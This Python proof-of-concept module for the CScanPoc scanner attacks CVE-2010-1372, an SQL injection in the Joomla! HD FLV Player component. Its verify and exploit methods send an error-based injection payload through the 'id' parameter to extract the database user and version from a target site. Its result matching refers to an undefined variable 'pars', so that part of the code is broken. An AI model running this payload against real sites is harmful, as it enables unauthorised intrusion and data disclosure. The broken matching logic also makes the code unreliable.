# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Joomla_0027'  # 平台漏洞编号
    name = 'HD FLV Player Component for Joomla! id Parameter SQL Injection Vulnerability'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2010-04-13'  # 漏洞公布时间
    desc = '''
        Joomla!是一款开放源码的内容管理系统(CMS)。
        Joomla!的组件HD FLV Player (com_hdflvplayer)存在SQL注入漏洞。
        远程攻击者可以利用脚本index.php的id执行任意的SQL指令。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-86873'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2010-1372'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '478c1d07-fc1d-4ef9-85ae-0b509a5f175b'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = ("1 AND (SELECT 1222 FROM(SELECT COUNT(*),CONCAT"
                       "(0x247e7e7e24,user(),0x2a2a2a,version(),0x247e7e7e24,"
                       "FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) -- -")
            exploit = "/index.php?option=com_hdflvplayer&id="
            vul_url = arg + exploit + payload
            # 自定义的HTTP
            httphead = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            }
            response = requests.get(
                vul_url, headers=httphead, timeout=50).text
            # 检查
            if 'Duplicate entry' in response:
                # 尝试提取信息
                match = re.search(pars, response, re.I | re.M)
                if match:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = ("1 AND (SELECT 1222 FROM(SELECT COUNT(*),CONCAT"
                       "(0x247e7e7e24,user(),0x2a2a2a,version(),0x247e7e7e24,"
                       "FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) -- -")
            exploit = "/index.php?option=com_hdflvplayer&id="
            vul_url = arg + exploit + payload
            # 自定义的HTTP
            httphead = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            }
            response = requests.get(
                vul_url, headers=httphead, timeout=50).text
            # 检查
            if 'Duplicate entry' in response:
                # 尝试提取信息
                match = re.search(pars, response, re.I | re.M)
                if match:
                    # 数据库用户名
                    dbname = match.group(1)
                    # 数据库版本
                    dbversion = match.group(2)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的数据库用户为{dbname} 数据版本为{dbversion}'.format(
                        target=self.target, name=self.vuln.name, dbname=dbname, dbversion=dbversion))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
